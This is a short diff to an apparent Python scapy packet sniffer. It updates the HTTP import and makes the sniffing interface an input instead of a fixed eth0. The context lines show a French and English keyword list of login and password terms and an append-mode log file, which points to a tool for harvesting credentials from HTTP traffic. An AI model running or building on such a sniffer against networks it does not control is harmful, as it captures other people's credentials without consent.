@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
 import scapy.all as scapy
-from scapy_http import http
+from scapy.layers import http
 from termcolor import colored
 
 def sniff(interface):
@@ -25,4 +25,6 @@ loadfile = open('./loadfile.txt','a')
 words = ["Login", "log in", "Log in", "Pseudo", "pseudo", "Identifiants", "identifiants", "identifiant", "Identifiant", "Mot de passe",
 		"mot de passe", "mdp", "ID", "Id", "id", "email", "mail", "adresse mail", "usr", "pwd", "User name:", "User name", "Password:", "password:",
 		"Password :", "Username:", "Username :", "password", "user", "username", "login", "pass", "User", "Password"]
-sniff("eth0")
+
+interface = str(input("Enter the interface on which you want to sniff: "))
+sniff(interface)
